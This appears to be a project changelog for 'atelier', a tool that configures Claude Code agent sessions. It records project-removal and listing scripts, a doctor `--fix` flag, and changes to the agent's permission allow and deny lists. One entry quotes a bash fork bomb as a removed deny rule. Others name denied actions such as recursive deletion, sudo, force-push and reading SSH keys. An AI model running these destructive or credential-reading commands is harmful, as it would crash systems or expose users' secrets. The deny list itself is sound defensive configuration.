- **`--json` shape mirrors `projects.json` rather than inventing a new schema.** The binary's JSON output is byte-equivalent to `jq '.projects[$p] + {status: ...}'` over the existing `projects.json` — operators who already script against `projects.json` can swap their input source without code changes. The added `status` field is the only delta.
- **Status computation in bash, not in jq.** The status check reads the filesystem (`-f` and `-d` tests on the project path), which jq can't do. Doing the check in bash and then merging via `jq --arg` keeps the JSON output clean without resorting to `jq -e` exit codes for filesystem state.
- **`/atelier:remove-project` uses `pwd`, not a positional argument.** The operator's mental model is *"I'm inside the project; remove it"*, not *"give me a slash command that takes a path"*. The wrapper's body still accepts a positional override for the edge case (e.g., removing a project the operator hasn't `cd`'d into), but defaults to `pwd`.
- **Worktree-context refusal in `/atelier:remove-project`.** A common mis-invocation would be running the slash command from a task worktree (`<project>-worktrees/<task>/`) — `pwd` would return the worktree path, not the project root, and `atelier-remove-project` would correctly find it not-registered and exit 0 with "nothing to do". But that's confusing UX. The wrapper checks `git rev-parse --abbrev-ref HEAD` for `task/*` and refuses with a clear "you're in a worktree, go to the project root" message.
- **Safety caveat on `/atelier:remove-project` is surfaced before running the binary**, not after. The operator should know the consequence (`current session loses atelier permissions on restart`) before the irreversible `--purge` deletes ROADMAP / IN_PROGRESS / HISTORY.

**Plugin scope:** mixed.
- Host-OS-layer: `scripts/atelier-list-projects`, `install.sh`.
- Plugin-shipped: `commands/list-projects.md`, `commands/remove-project.md`, `templates/settings.template.json`. Plugin **minor** version bump **0.6.7 → 0.7.0** per PLAN.md §14.2 — new operator-facing surface area (1 new binary + 2 new slash commands) is a feature, not a fix. Same versioning shape as M4.24.b (v0.6.0) which added a new agent + slash command. Existing projects see no behaviour shift, but the plugin's capability set grew.

**Verified locally with synthetic scenarios** for the binary (the slash commands are markdown contracts, validated by reading):

- **A — default mode**: 3 registered projects rendered as expected. Status detection correct for each shape (configured / partial / missing-directory).
- **B — `--quiet`**: 3 absolute paths, one per line, no metadata.
- **C — `--json`**: per-project entries match `projects.json` shape with `status` field merged. `jq .` parses cleanly.
- **D — zero projects registered**: emits `No atelier-managed projects registered.` followed by the `atelier-setup-project` hint.

`bash -n` + `shellcheck` clean (one `# shellcheck disable=SC2016` annotation on a backticks-as-display `printf` line — same pattern used in F30).

**Operator-visible:**

```
# Terminal
atelier-list-projects                 # human-facing list
atelier-list-projects --json | jq .   # machine-readable
atelier-list-projects --quiet         # paths only (pipe-friendly)

# Inside Claude Code
/atelier:list-projects                # invokes the binary, prints verbatim
/atelier:remove-project               # deconfigure $pwd; preserves operator content
/atelier:remove-project --purge       # deconfigure $pwd; full clean slate
```

**Follow-up paths:** none expected. Future iterations could add a `--health` flag to `atelier-list-projects` that re-runs `atelier-doctor` against each registered project (cross-project health), but that's deferred until an operator hits the friction.

### M7.1.F32 — `atelier-remove-project` (per-project removal, default preserves operator content; `--purge` extends to tracking files + .gitignore/.npmrc) — 2026-05-28
**PR:** [#106](https://github.com/AkaLab-Tech/atelier/pull/106)

Discovered during M7.1 dogfood-5. Operator asked: *"Hay un mecanismo para eliminar atelier de un proyecto?"* — and there wasn't. `atelier-uninstall` removes atelier from the whole system (every registered project at once, plus the global state under `$ATELIER_CONFIG_DIR`); nothing existed to surgically detach a single project (leave atelier itself intact, leave the other registered projects intact, just disconnect `<this>` one).

Use cases:
- **Project no longer wants atelier**: operator decides storefront should go back to being a regular non-atelier-managed repo. Today this meant manually editing `~/.claude-work/projects.json` plus `rm` of various files.
- **Resetting a broken setup**: after a partial `setup-project --reconfigure` left the project in an inconsistent state, the cleanest fix is to remove and re-setup. The first half of that cycle was missing.
- **Testing setup-project's idempotency**: developers iterating on `setup-project` need a fast "undo" between runs.

**Delivered:**

- **`scripts/atelier-remove-project` (new, ~230 lines bash).** Mirrors the style of `atelier-uninstall` (default vs `--purge` mode duality, `--yes` for non-interactive) but scoped to one project.
  - **Args**: `<project-path>` (required, positional) + `--purge` + `--yes`/`-y` + `--help`/`-h`.
  - **Default mode**: deletes `.claude/settings.json` + `.claude/settings.json.bak.*` + `.atelier.json`. Unregisters the project from `$ATELIER_CONFIG_DIR/projects.json`. **Preserves** `ROADMAP.md`, `IN_PROGRESS.md`, `HISTORY.md`, `.claude/CLAUDE.md` (operator-content artefacts), plus `.gitignore` and `.npmrc` (may carry operator-added entries beyond atelier's four / three additions).
  - **`--purge` mode**: extends the default with: delete the three tracking files (`ROADMAP.md`/`IN_PROGRESS.md`/`HISTORY.md`), delete `.claude/CLAUDE.md`, and **surgically strip** the four atelier-added entries from `.gitignore` (`.task-log/`, `.claude/settings.json`, `.claude/settings.local.json`, `.DS_Store`) and the three atelier-added guardrails from `.npmrc` (`ignore-scripts=true`, `minimum-release-age=10080`, `audit-level=moderate`) — preserving any other entries the operator added.
  - **Pre-flight refusal**: if the path is not registered in `projects.json`, exit 0 with `nothing to do — exiting cleanly`. Idempotent.
  - **Worktrees observation**: detects `<path>-worktrees/` with content and warns but does not touch it. Removing per-task worktrees belongs to `git wt rm` or to `atelier-uninstall`.
  - **Interactive confirmation**: lists exactly what will be deleted, what will be modified (purge only), what will be preserved, plus the unregister line; prompts `[y/N]`. `--yes` skips the prompt.
- **`install.sh` — new symlink** for `atelier-remove-project` in `phase_c_1_setup_project_helper` alongside `atelier-uninstall`. Same `_phase_c_1_symlink_helper` pattern as the other host-OS helpers.
- **`templates/settings.template.json`** — `Bash(atelier-remove-project:*)` added to the `allow` list so the helper can be invoked from inside Claude Code sessions without a permission prompt.

**Decisions captured:**

- **Conservative default + opt-in `--purge`.** Operators who deconfigure a project often want to keep their accumulated `ROADMAP.md` content (notes, decisions, links). Defaulting to delete-everything-now would surprise; defaulting to preserve gives a safe undo path. `--purge` is for the case where the operator genuinely wants a clean slate.
- **Surgical strip of `.gitignore` and `.npmrc`, not full delete.** Both files commonly have content the operator added beyond atelier's defaults (registry URLs, custom ignore patterns, `node_modules/`, etc.). `grep -vxF` (for the literal `.gitignore` lines) and `grep -vxE` (for the `.npmrc` lines) remove only the exact atelier-added lines and leave everything else untouched.
- **Idempotent on unregistered projects.** If the operator runs the script twice, or against a project that was never registered, the script exits 0 with a clear message. Same pattern as `atelier-uninstall`'s behaviour on a fresh system.
- **Worktrees out of scope.** Removing per-task worktrees is a different operation (`git wt rm`); coupling it to the project-remove flow would be surprising. The script warns about worktree presence so the operator knows to handle them, but doesn't touch them.
- **`pwd -P` canonicalization.** Mirrors what `atelier-setup-project` does when registering the path. Without it, paths under `/var/folders` (macOS tmp) or other symlinked roots would fail to match the registry entry.

**Plugin scope:** mixed.
- Host-OS-layer: `scripts/atelier-remove-project`, `install.sh`.
- Plugin-shipped: `templates/settings.template.json`. Plugin patch bump **0.6.6 → 0.6.7** per PLAN.md §14.2 (plugin-scope additive allow-list change; the helper itself is delivered via the host-OS layer that operators update via `atelier-update`).

**Verified locally with synthetic scenarios:**

- **A — unregistered path** → exit 0, `nothing to do — exiting cleanly`. No registry change, no file touched.
- **B — missing positional arg** → exit 1 with `<project-path> is required (run --help for usage)`.
- **C — default mode + `--yes`** → deletes `.claude/settings.json` + `.bak.*` + `.atelier.json`; unregisters from `projects.json`; preserves `ROADMAP.md`/`IN_PROGRESS.md`/`HISTORY.md`/`.claude/CLAUDE.md`/`.gitignore`/`.npmrc` verbatim; other registered projects untouched.
- **D — `--purge --yes`** → deletes everything from C plus the three tracking files plus `.claude/CLAUDE.md`; `.gitignore` reduced to only operator-added entries (`node_modules/`, `my-custom-entry`); `.npmrc` reduced to only operator-added entries (`registry=...`, `my-custom-setting=42`); registry entry unchanged for other projects.

`bash -n` + `shellcheck` clean.

**Operator-visible:**

```
atelier-remove-project /path/to/project              # safe deconfigure
atelier-remove-project /path/to/project --purge      # full clean slate
atelier-remove-project /path/to/project --purge --yes  # non-interactive
```

For the immediate dogfood-5 use case on `storefront`: the operator can now `atelier-remove-project /Users/mike/Work/storefront` to fully detach (or `--purge` for a clean slate before re-running `atelier-setup-project`).

**Follow-up paths:** none expected for the core feature.

### M7.1.F31 — allow atelier's own skills + slash commands in `settings.template.json` — 2026-05-28
**PR:** [#105](https://github.com/AkaLab-Tech/atelier/pull/105)

Discovered during M7.1 dogfood-5 immediately after M7.1.F30 (PR [#104](https://github.com/AkaLab-Tech/atelier/pull/104)) merged. Operator typed *"Dime el estado de las tareas"* in a Claude Code session inside the `storefront` project. Claude Code resolved that to the `/atelier:status` slash command and prompted the operator for authorisation:

```
Use skill "atelier:status"?
Claude may use instructions, code, or files from this Skill.
Show the operator what's in progress, what's blocked, and what's awaiting review...

Do you want to proceed?
> 1. Yes
  2. Yes, and don't ask again for atelier:status in /Users/mike/Work/storefront
  3. No
```

The expected behaviour for an atelier-managed project is that **atelier's own** features work without per-feature prompts — the operator opted into atelier; opting in again for each of the 8 skills + 9 slash commands the plugin ships, in each new project, is friction the design never accounted for. `settings.template.json` (instantiated into each project's `.claude/settings.json` by `/atelier:setup-project`) had explicit allows for `Bash(atelier-*:*)` and `mcp__plugin_atelier_playwright__*`, but **nothing** for the plugin's own skills or slash commands.

**Delivered:**

- **`templates/settings.template.json` — three new entries in the `allow` array**, sitting right after the existing `mcp__plugin_atelier_playwright__*` line:
  - `Skill(atelier:*)` — covers atelier's skills (`auto-merge`, `docker-env`, `pr-flow`, `retry-with-logs`, `safe-commit`, `safe-install`, `task-discovery`, `visual-validation`) by short reference.
  - `Skill(plugin:atelier:*)` — same skills referenced with the explicit `plugin:` prefix that Claude Code may emit internally depending on context. Both patterns are accepted as additive defense-in-depth so the entry doesn't depend on which form Claude Code resolves to on a given turn.
  - `SlashCommand(/atelier:*)` — covers atelier's slash commands (`/atelier:doctor`, `/atelier:next-task`, `/atelier:finish-task`, `/atelier:resume-task`, `/atelier:setup-project`, `/atelier:slice-task`, `/atelier:status`, `/atelier:update`, `/atelier:validate`). The screenshot showing the prompt was triggered via the slash-command path that Claude Code surfaced under a "Skill" label — both shape are covered by including this entry.

**Decisions captured:**

- **Wildcards over enumeration.** Considered enumerating each skill / command explicitly (`Skill(atelier:auto-merge)`, `Skill(atelier:pr-flow)`, ...). Rejected: every new skill or command we add later (and there are several pending in the ROADMAP) would need an additional template entry plus a doctor check + operator-rules note. The `atelier:*` wildcard scopes the allow to the plugin's own namespace, no broader — operators who install third-party Claude Code plugins still see permission prompts for those.
- **Three patterns, not one.** Claude Code's display naming (`atelier:status` in the prompt screenshot) doesn't always match the canonical id (`plugin:atelier:status` in some contexts; `SlashCommand(/atelier:status)` from the slash-command surface). Rather than reverse-engineer which one will match at runtime, we include all three. They're additive — extra entries that don't match are inert; missing ones cause the prompt to fire.
- **No reconfigure needed for newly-created projects.** New projects bootstrapped after this version ships pick up the new entries automatically from `setup-project`'s template instantiation. Existing projects (like `storefront`) need a `/atelier:setup-project --reconfigure` after `atelier-update` brings the new template into `$ATELIER_CONFIG_DIR/templates/`. The permission-diff prompt from M6.1.b will surface the three new entries explicitly as `NEW permissions`, so the operator sees what's being added before accepting.

**Plugin scope:** plugin-shipped — `templates/settings.template.json` is plugin content that the operator's installed plugin cache loads via `claude plugin update`. Plugin patch bump **0.6.5 → 0.6.6** per PLAN.md §14.2 (plugin-scope additive change in the allow list; no behaviour shift for projects whose existing `settings.json` already authorises these patterns).

**Verified locally:**

- `jq empty templates/settings.template.json` passes — JSON still valid after the additions.
- Diff shows exactly the three new lines inserted (plus the surrounding blank-line spacing); no other rules affected.

**Operator-visible behaviour change:**

After merging + `atelier-update` + `/atelier:setup-project --reconfigure` on each existing atelier-managed project (or zero-config for new projects), invoking any atelier skill or slash command no longer fires the "Use skill / Do you want to proceed?" permission prompt. The pre-F31 workaround — choosing the "Yes, and don't ask again for X in /path" option once per skill per project — remains effective for projects the operator chooses not to reconfigure.

**Follow-up paths:** none expected for the core bug. If a future iteration of Claude Code changes the canonical naming of plugin skills / commands again, the three additive patterns above cover the cases we know about today; new patterns can be appended without removing the old ones.

### M7.1.F30 — `atelier-doctor --fix` auto-executes runnable fixes — 2026-05-28
**PR:** [#104](https://github.com/AkaLab-Tech/atelier/pull/104)

Discovered during M7.1 dogfood-5 immediately after M7.1.F29 (PR [#103](https://github.com/AkaLab-Tech/atelier/pull/103)) merged. Operator ran `atelier-doctor` to verify everything was working post-update and saw the expected drift report:

```
✗ atelier@akalab-tech 0.6.3 → 0.6.4

To apply pending fixes, run:
    CLAUDE_CONFIG_DIR=$ATELIER_CONFIG_DIR claude plugin marketplace update akalab-tech
    CLAUDE_CONFIG_DIR=$ATELIER_CONFIG_DIR claude plugin update atelier@akalab-tec
```

Operator's response: *"No quiero tener que correr todo eso para aplicar los fixes."* (paraphrased: the copy-paste fix is friction the operator shouldn't have to do for a mechanical update.) Asked for `atelier-fix` as a separate command — or, better, for the fix to apply automatically.

Trade-off considered:

- **Auto-fix by default** (operator's first preference): violates the doctor's "read-only / never modify" contract. If `claude plugin update` fails partway through (auth, network, marketplace cache stale), the doctor leaves the operator in a worse state than they started. CI / script use cases also break (they expect read-only).
- **Separate `atelier-fix` command**: more surface to maintain, duplicates the doctor's check logic to decide what to fix.
- **`atelier-doctor --fix` flag** (chosen): single binary, opt-in via flag, doctor stays read-only by default. Composable with non-interactive flows (`atelier-doctor --fix` from a script works; bare `atelier-doctor` for diagnostics). Discovery is solved by changing the footer: when there are runnable fixes pending and `--fix` wasn't passed, the footer now ends with `Tip: run \`atelier-doctor --fix\` to auto-execute the N runnable fix(es).` instead of forcing the operator to copy-paste each command.

**Delivered:**

- **`scripts/atelier-doctor` — two-flavour `push_fix` API.** The single `push_fix` function is split into:
  - `push_fix_auto <cmd>` for runnable shell commands the doctor can execute under `--fix`. Stores the command in both `FIX_BLOCKS` (display) and `FIX_AUTO_COMMANDS` (execution).
  - `push_fix_manual <txt>` for instructions only humans should act on (paths, "re-run install.sh", "hand-edit ~/.claude/settings.json"). Only goes to `FIX_BLOCKS`. Never executed by `--fix`.
  Migration of all 21 existing call sites: the 3 plugin-update fixes from `check_plugin_drift` are `push_fix_auto`; the 19 remaining (install.sh re-runs, comments, manual edits, npm/playwright install commands the operator needs to vet) are `push_fix_manual`.
- **`scripts/atelier-doctor` — new `--fix` flag and execution loop.** Arg parsing moved to the top of the script (legacy `${1:-} --help` case at bottom removed). When `--fix` is passed and `FIX_AUTO_COMMANDS` is non-empty, the doctor prints `Applying N runnable fix(es)`, executes each via `eval` (so the literal `$ATELIER_CONFIG_DIR` in the stored command expands at execution time), and reports `✓ OK` or `✗ FAIL (rc=N)` per fix with the failing command's output indented under the failure. Manual fixes still print as text after the auto-fix section. Final summary line tallies `applied OK / failed / need manual action`.
- **`scripts/atelier-doctor` — footer change.** When `--fix` is not passed and at least one runnable fix exists, the footer ends with `Tip: run \`atelier-doctor --fix\` to auto-execute the N runnable fix(es).` plus an optional second line noting how many remaining fixes still need manual attention.
- **`commands/doctor.md` — `argument-hint: "[--fix]"` + updated description.** The slash command now passes `--fix` through to the binary if `$ARGUMENTS` contains it. Frontmatter `description` updated to mention the new behaviour. The "Stop rule" (M7.1.F25) and the verbatim-pass-through contract are unchanged — the binary's output remains the entire job.
- **`operator-rules.md` — new bullet** in the "Keeping atelier up to date (M6.1)" section documenting `atelier-doctor --fix` alongside `atelier-update` and `/atelier:update`. Same shape as the other entries.

**Decisions captured:**

- **`eval` to execute, not `bash -c` or array-splat.** The stored fix command can contain pipes / redirections / quoted args (today only flat commands, but the API leaves room). `eval` is the only mechanism that re-interprets the stored string the way the operator would if they copy-pasted it themselves. The eval surface is bounded: the strings come exclusively from this script's own `push_fix_auto` calls, never from user input.
- **Two functions instead of `push_fix <flag>`.** Considered a single `push_fix <auto|manual> <text>` API. Rejected because call sites read more cleanly as `push_fix_auto "..."` / `push_fix_manual "..."` than `push_fix auto "..."` / `push_fix manual "..."` — the flavour is part of the function identity, not a parameter.
- **Manual fixes interleaved with auto fixes in `FIX_BLOCKS` for display, but parallel separation for execution.** The display preserves the order the checks ran (which is the order the operator reads the report); the execution loop iterates `FIX_AUTO_COMMANDS` separately so manual fixes don't get accidentally eval'd. The duplication of auto fixes in both arrays is the simplest correct model.
- **Don't auto-re-check after `--fix`.** Considered: after applying fixes, re-run the affected check functions to confirm they pass. Rejected for v1 because the re-run would need to be selective (re-checking the legacy-hooks check after fixing a plugin drift is wasted work), and the operator running `atelier-doctor` again post-`--fix` is a one-command verification that scales correctly.
- **Footer's `--fix` tip only shows when runnable fixes exist.** A doctor run with only manual fixes pending shouldn't suggest `--fix` (it wouldn't do anything). Same logic for the "remaining N need manual action" sub-line.

**Plugin scope:** mixed.
- Host-OS-layer (the actual feature): `scripts/atelier-doctor`.
- Plugin-shipped: `commands/doctor.md`, `operator-rules.md`. Plugin patch bump **0.6.4 → 0.6.5** per PLAN.md §14.2 (plugin-scope additive change in the slash command + docs; the helper binary's behaviour is delivered via the host-OS layer that operators update via `atelier-update`).

**Verified locally:**

- `bash -n` + `shellcheck` clean on the modified script (with two `shellcheck disable=SC2016` annotations on the two `printf` lines that contain backticks-as-display-formatting in their template — backticks are deliberate, not command substitutions).
- `atelier-doctor --help` shows the new help section.
- `atelier-doctor --bogus` exits 2 with `unknown arg: --bogus` clearly surfaced.
- Pre-existing SC2006 (legacy backtick in an unrelated comment, line 457) untouched — same as it was after F29.

**Operator-visible behaviour change:**

After merging + `atelier-update`, the doctor report no longer asks the operator to copy-paste long `CLAUDE_CONFIG_DIR=...` commands for routine plugin drift. The new flow:

```
$ atelier-doctor
(report shows ✗ on atelier@akalab-tech)
...
Tip: run `atelier-doctor --fix` to auto-execute the 2 runnable fix(es).

$ atelier-doctor --fix
(report + Applying 2 runnable fix(es) section + ✓ OK per fix)
Summary: 2 fix(es) applied OK. Re-run `atelier-doctor` to verify.

$ atelier-doctor
(clean report, all ✓)
```

**Follow-up paths:** none expected for the core feature. A future M-task could add an `--fix --yes` to auto-confirm any prompts inside fix commands (e.g., if a future fix calls `apt install` or similar), but today's runnable fixes are all `claude plugin ...` which don't prompt.

### M7.1.F29 — `atelier-doctor` + `atelier-update` must prefix `CLAUDE_CONFIG_DIR="$ATELIER_CONFIG_DIR"` on every `claude` subprocess — 2026-05-28
**PR:** [#103](https://github.com/AkaLab-Tech/atelier/pull/103)

Discovered during M7.1 dogfood-5 immediately after M7.1.F28 (PR [#102](https://github.com/AkaLab-Tech/atelier/pull/102)) merged. Operator ran a clean uninstall + re-install pass to test the new version end-to-end, then ran `atelier-doctor` from their interactive terminal and saw:

```
Plugins (compared against AkaLab-Tech/claude-plugins marketplace)
    ✗ atelier@akalab-tech not installed
    ✗ claude-roadmap-tools@akalab-tech not installed
```

The operator had **definitely** re-run `install.sh`; Phase C.2 had completed; the plugins should have been there. They followed the doctor's suggested fix (`claude plugin install atelier@akalab-tech`) — and got `Failed to install plugin: Plugin "atelier" not found in marketplace "akalab-tech"`. The next suggested fallback (`claude plugin marketplace update akalab-tech`) also failed with `Marketplace 'akalab-tech' not found`.

**Operator caught the root cause first** (deserves the credit): atelier maintains a separate config root `$ATELIER_CONFIG_DIR` (default `~/.claude-work/`), distinct from the operator's personal `~/.claude/`. `install.sh` Phase C.2 sets `CLAUDE_CONFIG_DIR="$ATELIER_CONFIG_DIR"` before each `claude plugin marketplace add` / `claude plugin install` call — so the plugins land **in the atelier-managed config**. The `atelier()` shell function (M7.1.F13) sets the same env var for interactive sessions. But the standalone host-OS helpers `atelier-doctor` and `atelier-update` were invoking `claude` **without** the prefix, so they read/wrote the operator's personal config root instead. The plugins genuinely were installed — just at the address neither helper was looking at.

**Delivered:**

- **`scripts/atelier-doctor` — `check_plugin_drift()` prefixed.** The single `claude plugin list --json` invocation that resolves `local_v` now runs as `CLAUDE_CONFIG_DIR="$ATELIER_CONFIG_DIR" claude plugin list --json`. The two `push_fix` suggestions that the doctor surfaces to the operator (`claude plugin install ...`, `claude plugin marketplace update ... && claude plugin update ...`) now include the same `CLAUDE_CONFIG_DIR=$ATELIER_CONFIG_DIR` prefix so copy-paste works from any terminal (including the operator's regular non-atelier shell).
- **`scripts/atelier-update` — `claude plugin update` calls prefixed.** Both invocations (atelier + claude-roadmap-tools) now prefix `CLAUDE_CONFIG_DIR="$ATELIER_CONFIG_DIR"`. Pre-F29 the call returned 0 (no-op against the personal config, no error to surface) so the helper claimed success, but Claude Code sessions kept loading the stale version because the atelier-managed plugin cache was untouched.
- **`operator-rules.md` — new "Invoking `claude` from atelier scripts (M7.1.F29)" section.** Documents the rule: every `claude` invocation from an atelier script must prefix `CLAUDE_CONFIG_DIR="$ATELIER_CONFIG_DIR"`. The interactive `atelier()` shell function already sets the env var for sessions; the rule only matters for standalone scripts that invoke `claude` as a subprocess. The suggestions an atelier script surfaces to the operator (copy-paste fixes) must also include the prefix.

**Decisions captured:**

- **Per-call prefix, not `export` at script start.** Considered `export CLAUDE_CONFIG_DIR="$ATELIER_CONFIG_DIR"` at the top of each script (one line, applies to everything). Rejected: an `export` would leak the value into sub-subprocesses that may not want it. The per-call prefix scopes the override to exactly the call that needs it, the same way `GIT_CONFIG_GLOBAL="..." git commit ...` (M7.1.F7b) scopes the git-identity override.
- **Same rule for operator-facing fix suggestions.** When the doctor tells the operator *"to apply pending fixes, run: `claude plugin install ...`"*, that suggestion is the operator's first attempt and lands them on the same wrong config root. Including the prefix in the suggested command saves the operator from discovering the bug themselves (the way the M7.1 dogfood-5 operator did).
- **`install.sh` and `atelier-uninstall` already had it right.** `install.sh` Phase C.2's plugin install calls inherit the `export CLAUDE_CONFIG_DIR=...` set at the top of the script. `atelier-uninstall` line 208 prefixes `CLAUDE_CONFIG_DIR="$ATELIER_CONFIG_DIR"` explicitly. Both were already correct; F29 brings the two remaining standalone helpers in line.

**Plugin scope:** mixed.
- Host-OS-layer (the actual bug fix): `scripts/atelier-doctor`, `scripts/atelier-update`.
- Plugin-shipped: `operator-rules.md`. Plugin patch bump **0.6.3 → 0.6.4** per PLAN.md §14.2 (plugin-scope additive doc; the helper scripts' behaviour fix is delivered via the host-OS layer that operators update via `atelier-update`).

**Verified locally:**

- `bash -n` + `shellcheck` clean on both modified scripts.
- Manual inspection: every `claude plugin ...` / `claude auth ...` invocation in `scripts/` either (a) is inside `install.sh`'s `export CLAUDE_CONFIG_DIR=...` scope, (b) already prefixes `CLAUDE_CONFIG_DIR="$ATELIER_CONFIG_DIR"` explicitly (`atelier-uninstall`), or (c) is being touched by this PR. No other helpers remain affected.
- Operator-facing `push_fix` strings now match the pattern shown in the new `operator-rules.md` section, so the doctor's output is self-consistent with the documented rule.

**Operator-visible behaviour change:** after merging + `atelier-update` (which now actually refreshes the atelier-managed plugin cache), running `atelier-doctor` from any terminal — including the operator's regular non-atelier shell — reports the installed plugin versions correctly instead of false-negative `not installed`.

**Follow-up paths:** none expected for the core bug. A future M-task could centralise the prefix into a one-line helper (`_claude() { CLAUDE_CONFIG_DIR="$ATELIER_CONFIG_DIR" claude "$@"; }`) for any new scripts that land, but two helpers fixed at the call site is not enough surface to justify a refactor today.

### M7.1.F28 — remove invalid `Bash(:(){ :|:&};:)` fork-bomb entry from `permissions.deny` — 2026-05-28
**PR:** [#102](https://github.com/AkaLab-Tech/atelier/pull/102)

Discovered during M7.1 dogfood-5 (operator's first session on `0.6.2` after a clean reinstall). Claude Code's `/atelier:setup-project`-instantiated `.claude/settings.json` triggered a Settings Warning at session start:

```
Invalid permission rule "Bash(:(){ :|:&};:)" was skipped: Empty parentheses.
Either specify a pattern or use just "Bash" without parentheses
```

Root cause: the entry was added to `templates/settings.template.json` as defense-in-depth against Claude generating a bash fork bomb (`:(){ :|:&};:`). Claude Code's permission-pattern parser sees the internal `()` and treats it as "empty parentheses", which is invalid syntax in its DSL. The rule was therefore being **silently skipped** at load time — the defense it was meant to provide didn't exist; the only effect was a startup warning.

The fix is to remove the entry. Realistic threat-model assessment:

- **Claude is not going to write `:(){ :|:&};:` spontaneously** while implementing features. It is a niche bash trivia construct; the model has no reason to emit it during normal task execution.
- **If it did**, the deny rule would not have mattered: Claude Code never enforced it (it was being skipped from day one). The fact that no fork bomb has occurred in 100+ task chains is independent of this rule's existence.
- **If a real attacker controlled Claude's output stream and tried to inject a fork bomb**, no permission rule can save the operator anyway — the same attacker can just rewrite the bomb in 50 different forms that wouldn't match any single pattern. The realistic backstop is the kernel's process limit (`ulimit -u`), not a denylist entry.

So: the entry was symbolic, the symbolism is now broken (Claude Code rejects it), and the only operationally honest move is to remove it.

**Delivered:**

- **`templates/settings.template.json`** — single line removed (the `Bash(:(){ :|:&};:)` entry in the `deny` array). All other deny entries — `rm -rf *`, `sudo *`, `git push --force*`, `gh auth logout*`, `Read(~/.ssh/**)`, etc. — are intact and continue to be the operationally meaningful guardrails.

**Decisions captured:**

- **Remove vs replace with a different pattern.** Considered substituting `Bash(:()*)`, `Bash(*:|:*)`, or a regex matching common fork-bomb shapes. Rejected for three reasons: (a) any pattern with internal `()` will hit the same Claude Code parser limit; (b) even a working pattern catches a single textual variant — the threat model the entry was supposedly addressing requires catching *all* possible fork bombs, which a denylist cannot do; (c) honesty about what defenses are operative beats sprinkling more symbolic entries. The clean removal makes the deny list accurate.
- **No replacement documentation about fork-bomb defense.** Could have added a `_comment` JSON field or a section in `operator-rules.md` explaining "we removed a symbolic defense; the real one is the kernel". Rejected because (a) JSON `_comment` adds noise to a clean file and (b) operator-rules.md should describe operational policy the agent must follow, not historical artifacts. The HISTORY entry above is the audit record.
- **Patch bump 0.6.2 → 0.6.3.** Plugin-scope change (`templates/settings.template.json` is plugin-shipped). The behaviour shift is removing a silently-skipped rule, so no agent behaviour actually changes — but operators get a cleaner startup (no warning) and the deny list now matches what Claude Code actually enforces.

**Verified locally:**

- `jq empty templates/settings.template.json` passes — JSON still valid after the deletion.
- Diff shows exactly one line removed (the offending entry) plus the surrounding blank line cleanup; no other rules affected.
- A re-instantiated `.claude/settings.json` (via the substitution sed `install.sh` uses) no longer contains the entry — Claude Code's startup warning will not fire on installations updated past this version.

**Spawned in this session — published retroactive releases.** Same session that discovered F28, the operator's `/atelier:doctor` reported `✗ atelier@akalab-tech 0.6.2 → 0.5.7` because `gh api releases/latest` returned `v0.5.7` while local was `0.6.2` (post-M6.1.b merge). Diagnosed: `claude plugin install` resolves the HEAD of the default branch via the marketplace, while `doctor` compares against the last *published GitHub release* — and the maintainer (operator) hadn't released `v0.5.8 → v0.6.2` after the corresponding PRs merged earlier in the session. Resolved out-of-band by publishing the 7 missing releases manually (`gh release create v0.5.8 --target <sha> ...` × 7). After that pass, `gh api releases/latest` returns `v0.6.2` and the doctor reports `up to date`. This is not part of F28 itself (no commit lands in this PR for it) but is recorded here because it surfaced together. A proper follow-up — automating release creation on plugin.json version bumps, or having doctor compare against the HEAD `plugin.json` instead of GitHub releases — is captured as a future task.

### M6.1.b — `atelier-permission-diff` + `atelier-update` integration + `/atelier:update` slash command — 2026-05-27
**PR:** [#101](https://github.com/AkaLab-Tech/atelier/pull/101)

Second and final half of `M6.1 — update.sh` (PLAN.md §9). Builds on M6.1.a (PR [#100](https://github.com/AkaLab-Tech/atelier/pull/100)) which shipped the engine — pull, delta classification, template refresh, plugin-cache refresh. This PR adds the **UX** layer: the permission-diff renderer, the prompt-and-revert integration, the `/atelier:update` slash command, and the operator-facing doc.

Without this PR (the post-M6.1.a / pre-M6.1.b window), `atelier-update` applies template changes silently with only a warning that "settings.template.json changed; re-run via /atelier:update once M6.1.b lands to see the diff". This PR closes that loop end-to-end: now the operator sees what permissions changed, what they mean operationally, and explicitly accepts or rejects before the agent's authority is widened or narrowed.

**Delivered:**

- **New `scripts/atelier-permission-diff` (~250 lines bash).** Reads two `settings.template.json` files (`--old <path> --new <path>`), computes the per-category set difference (`allow` / `deny` / `ask`) with jq, renders an operator-facing block matching the shape of PLAN.md §9: `NEW permissions:` / `REMOVED permissions:` / `Impact on your day-to-day:`. Each entry includes a one-line human description from a hardcoded table covering the ~75 entries currently in `settings.template.json` (atelier helpers, pnpm/git/gh/docker commands, the deny-list patterns, the MCP tools); unknown entries are shown verbatim with `(no description — see HISTORY.md for change rationale)` so the diff stays complete even when the table lags behind. ANSI colour by default on TTY; `--no-color` for piping. Exit 0 = no changes, exit 1 = changes rendered, exit 2 = error.
- **`scripts/atelier-update` — permission-diff integration (M6.1.b extension).** When the classifier marks `settings.template.json` as changed, the helper now: (1) extracts the pre-pull `settings.template.json` from git history via `git show $OLD_SHA:templates/settings.template.json` (no need to stash anything pre-pull), (2) invokes `atelier-permission-diff` against the old + new, (3) prompts `Apply these permission changes? [y/N]` on TTY, (4) on `y`: applies the new template to `$ATELIER_CONFIG_DIR/templates/settings.template.json`; on `N` or non-TTY: **preserves** the old template in `$ATELIER_CONFIG_DIR` so the agent keeps operating under the prior permission set. Either way, the other templates (`project-claude.md.template`, `atelier.template.json`) refresh normally — they don't carry permission semantics. The final report surfaces whether the permission changes were accepted or declined.
- **New `commands/update.md` (`/atelier:update` slash command).** Thin wrapper around `atelier-update` that exists because the helper's interactive prompt requires a TTY; `claude -p` and some terminal multiplexers don't always provide one. The slash command goes through Claude Code's I/O, which is interactive by construction. Accepts an optional `--dry-run` argument that the helper forwards.
- **`install.sh` — symlink for `atelier-permission-diff`** in `phase_c_1_setup_project_helper` alongside the other `atelier-*` helpers.
- **`templates/settings.template.json` — `Bash(atelier-permission-diff:*)` added to the `allow` list** so the slash command and direct invocations don't trip a permission prompt.
- **`operator-rules.md` — new "Keeping atelier up to date (M6.1)" section.** Brief operator-facing reference covering: when to use the terminal command vs the slash command, what the permission diff looks like, what happens on `N`, the "restart open Claude Code sessions" reminder after a successful update.

**Decisions captured:**

